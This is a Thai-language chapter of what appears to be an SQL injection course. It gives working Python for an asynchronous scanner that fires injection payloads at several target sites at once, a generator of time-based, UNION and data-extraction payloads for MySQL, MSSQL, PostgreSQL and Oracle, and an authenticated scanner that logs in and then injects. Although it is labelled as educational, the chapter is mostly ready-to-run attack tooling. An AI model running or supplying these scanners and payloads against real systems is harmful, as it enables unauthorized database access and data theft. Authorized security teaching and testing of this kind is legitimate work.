# Part 036: Advanced SQL Injection Automation

## ภาพรวม

สร้างเครื่องมือ automation ขั้นสูงสำหรับ SQL Injection testing

**ขั้นตอนที่ 536-555**

---

## 536. Async SQL Injection Scanner

```python
#!/usr/bin/env python3
"""
Async SQL Injection Scanner - High Performance
สำหรับการศึกษาเท่านั้น
"""

import asyncio
import aiohttp
import time
from typing import List, Dict, Optional

class AsyncSQLiScanner:
    def __init__(self, delay: float = 0.1, concurrency: int = 10):
        self.delay = delay
        self.concurrency = concurrency
        self.semaphore = asyncio.Semaphore(concurrency)
        self.findings = []
    
    async def test_payload(self, session: aiohttp.ClientSession,
                           url: str, param: str, payload: str) -> Optional[Dict]:
        async with self.semaphore:
            try:
                params = {param: payload}
                async with session.get(url, params=params, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    text = await r.text()
                    await asyncio.sleep(self.delay)
                    
                    error_patterns = [
                        'sql syntax', 'mysql error', 'ora-01', 'sqlite_',
                        'postgresql', 'syntax error', 'unclosed quotation'
                    ]
                    
                    for pattern in error_patterns:
                        if pattern in text.lower():
                            return {
                                'url': url, 'param': param,
                                'payload': payload, 'type': 'error-based',
                                'evidence': pattern
                            }
            except Exception:
                pass
            return None
    
    async def scan_url(self, url: str, params: List[str],
                       payloads: List[str]) -> List[Dict]:
        async with aiohttp.ClientSession() as session:
            tasks = []
            for param in params:
                for payload in payloads:
                    task = self.test_payload(session, url, param, payload)
                    tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            findings = [r for r in results if r and isinstance(r, dict)]
            self.findings.extend(findings)
            return findings
    
    async def scan_multiple(self, targets: List[Dict]) -> List[Dict]:
        """Scan multiple targets concurrently"""
        all_findings = []
        
        tasks = []
        for target in targets:
            task = self.scan_url(
                target['url'],
                target.get('params', ['id']),
                target.get('payloads', ["'", "' OR '1'='1"])
            )
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        for result in results:
            all_findings.extend(result)
        
        return all_findings


async def main():
    scanner = AsyncSQLiScanner(delay=0.1, concurrency=20)
    
    payloads = [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1'-- -",
        "1 AND 1=2-- -",
        "1 UNION SELECT NULL-- -",
    ]
    
    targets = [
        {'url': 'http://target1.com/search', 'params': ['q', 'id'], 'payloads': payloads},
        {'url': 'http://target2.com/item', 'params': ['id', 'cat'], 'payloads': payloads},
    ]
    
    start = time.time()
    findings = await scanner.scan_multiple(targets)
    elapsed = time.time() - start
    
    print(f"\n[*] Scan completed in {elapsed:.2f}s")
    print(f"[*] Found {len(findings)} potential vulnerabilities")
    for f in findings:
        print(f"  [+] {f['url']} | param={f['param']} | payload={f['payload']}")


if __name__ == '__main__':
    asyncio.run(main())
```

---

## 537. Smart Payload Generator

```python
class PayloadGenerator:
    """Generate SQL injection payloads dynamically"""
    
    def __init__(self, db_type: str = 'mysql'):
        self.db_type = db_type.lower()
    
    def get_sleep_payload(self, seconds: int = 5, position: int = 1) -> list:
        templates = {
            'mysql': [
                f"' AND SLEEP({seconds})-- -",
                f"1 AND SLEEP({seconds})-- -",
                f"' OR SLEEP({seconds})-- -",
                f"1; SELECT SLEEP({seconds})-- -",
            ],
            'mssql': [
                f"'; WAITFOR DELAY '0:0:{seconds}'-- -",
                f"1; WAITFOR DELAY '0:0:{seconds}'-- -",
            ],
            'postgresql': [
                f"'; SELECT pg_sleep({seconds})-- -",
                f"1 AND (SELECT 1 FROM pg_sleep({seconds})) IS NOT NULL-- -",
            ],
            'oracle': [
                f"' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('x',{seconds})-- -",
            ]
        }
        return templates.get(self.db_type, templates['mysql'])
    
    def get_union_payloads(self, columns: int, string_col: int = 1) -> list:
        nulls = ['NULL'] * columns
        payloads = []
        
        for i in range(columns):
            cols = nulls.copy()
            cols[i] = "'sqli_test'"
            payloads.append(f"' UNION SELECT {','.join(cols)}-- -")
        
        return payloads
    
    def get_extraction_payloads(self, query: str, columns: int = 2,
                                 string_col: int = 1) -> list:
        nulls = ['NULL'] * columns
        nulls[string_col - 1] = f"({query})"
        return [f"' UNION SELECT {','.join(nulls)}-- -"]
    
    def boolean_payload(self, condition: str) -> str:
        return f"1 AND ({condition})-- -"
    
    def time_payload(self, condition: str, seconds: int = 5) -> str:
        if self.db_type == 'mysql':
            return f"1 AND IF({condition}, SLEEP({seconds}), 0)-- -"
        elif self.db_type == 'mssql':
            return f"1; IF ({condition}) WAITFOR DELAY '0:0:{seconds}'-- -"
        elif self.db_type == 'postgresql':
            return f"1 AND (SELECT CASE WHEN ({condition}) THEN pg_sleep({seconds}) ELSE pg_sleep(0) END) IS NOT NULL-- -"


# Usage
gen = PayloadGenerator('mysql')
print(gen.get_sleep_payload(5))
print(gen.get_extraction_payloads("SELECT database()", 3, 2))
```

---

## 538. Session Management Automation

```python
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class AuthenticatedScanner:
    def __init__(self, login_url, username, password, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        
        # Retry configuration
        retry = Retry(total=3, backoff_factor=1)
        adapter = HTTPAdapter(max_retries=retry)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        # Login
        self._login(login_url, username, password)
    
    def _login(self, login_url, username, password):
        r = self.session.post(login_url, data={
            'username': username,
            'password': password
        })
        if r.status_code == 200 and 'logout' in r.text.lower():
            print("[+] Login successful")
        else:
            print("[-] Login failed")
    
    def test_injection(self, param: str, payload: str) -> dict:
        r = self.session.get(self.target_url, params={param: payload}, timeout=15)
        return {
            'status': r.status_code,
            'length': len(r.text),
            'response': r.text[:500]
        }

# Usage
scanner = AuthenticatedScanner(
    login_url="http://example.com/login",
    username="testuser",
    password="testpass",
    target_url="http://example.com/profile"
)

result = scanner.test_injection('user_id', "1' OR '1'='1")
print(result)
```

---

## สรุป

Advanced Automation:
- **Async** - scan บัญชีเร็วกว่า synchronous
- **Smart Payloads** - generate ตาม DB type
- **Session Management** - login ก่อน test
- **Retry Logic** - handle flaky networks

---

*Part 036 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
